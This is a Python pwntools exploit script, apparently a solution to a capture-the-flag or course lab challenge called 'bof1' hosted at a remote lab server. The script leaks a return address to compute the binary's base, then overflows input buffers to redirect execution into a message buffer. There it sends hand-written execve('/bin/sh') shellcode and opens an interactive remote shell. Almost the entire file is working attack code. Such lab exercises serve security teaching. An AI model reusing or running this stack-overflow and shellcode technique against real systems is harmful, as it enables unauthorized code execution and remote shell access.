#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys
import struct

context.arch = 'amd64'
context.os = 'linux'

exe = './bof1'
port = 10258

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

# asm code
# write five 8 bytes instructions to overflow buffer
print(shellcraft.sh())

# shellcode = asm(
#   '''
#   xor rax, rax
#   mov rdi, 0x68732f6e69622f
#   push rdi
  
  
#   xor rsi, rsi
#   xor rdx, rdx
#   mov rax, 0x3b
#   syscall
  
#   xor rax, rax
#   inc rax
#   syscall
  
#   '''
# )

shellcode = asm(
  '''
  /* execve(path='/bin///sh', argv=['sh'], envp=0) */
  /* push b'/bin///sh\x00' */
    push 0x68  /* h */
    mov rax, 0x732f2f2f6e69622f /* 0x68732f6e69622f */
    push rax
    mov rdi, rsp
  /* push argument array ['sh\x00'] */
  /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* envp = 0 */
  /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
    
    xor rax, rax
    inc rax
    syscall
  '''
)

code = asm(shellcraft.sh())
# b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
payload = b'A'*40


r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)
    

r.recvuntil(b"What's your name? ")
r.send(payload)
recv = r.recvline().strip()
print(recv)
ind = recv.rfind(b'A')
recv = recv[ind+1:]
print(recv)
addr = int.from_bytes(recv.ljust(8, b'\x00'), byteorder='little')
# (1) addr = struct.unpack("<Q", recv.ljust(8, b'\x00'))[0]
print(f"return address: 0x{addr:x}")

# (2) recv = recv[ind+1:].hex()
# recv_reversed = [recv[i:i+2] for i in range(0, len(recv), 2)]
# recv_reversed = recv_reversed[::-1]
# addr = "".join(recv_reversed)

task_offset= 0x8ae4
msg_offset = 0xd31e0

# print(f"task() return address: 0x{addr:x}")
base = addr - task_offset
print(f"base: 0x{base:x}")
msg = base + msg_offset
print(f"msg: 0x{msg:x}")
print(f"msg: {p64(msg)}")


r.sendlineafter(b"What's the room number? ", b'A'*40)
print(r.recvline())
r.sendafter(b"What's the customer's name? ", b'B'*40+p64(msg))
print(r.recvline())
r.sendafter(b"Leave your message: ", shellcode)



# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 8a15:       ba 00 02 00 00          mov    $0x200,%edx
# 8a1a:       48 8d 05 bf a7 0c 00    lea    0xca7bf(%rip),%rax        # d31e0 <msg>

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
# b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'